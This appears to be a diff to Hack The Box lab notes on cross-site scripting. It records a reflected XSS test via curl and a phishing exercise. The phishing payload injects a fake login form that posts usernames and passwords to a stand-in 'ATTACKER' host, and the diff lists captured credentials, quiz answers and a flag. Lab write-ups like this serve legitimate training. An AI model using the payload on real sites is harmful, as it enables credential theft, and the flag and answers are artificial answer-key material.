@@ -112,3 +112,11 @@ Reflection confirmed in the EMAIL parameter:
   curl "http://154.57.164.65:37488/?fullname=x&username=x&password=x&email=<script>alert(1)</script>" -> reflected unescaped
 Q1 vulnerable parameter: email
 Q2 type of XSS: Reflected
+
+---
+# XSS Phishing exercise (target 10.129.234.166 /phishing) [HTB VPN - not reachable from sandbox]
+Injection point: /phishing/index.php?url= rendered into <img src='URL'>
+Payload: '><h3>Please login to continue</h3><form action=http://ATTACKER><input name=username><input name=password><input type=submit></form><script>document.getElementById('urlform').remove()</script><!--
+Victim creds captured: admin : p1zd0nt57341myp455
+Login at /phishing/login.php -> flag
+ANSWER: HTB{r3f13c73d_cr3d5_84ck_2_m3}
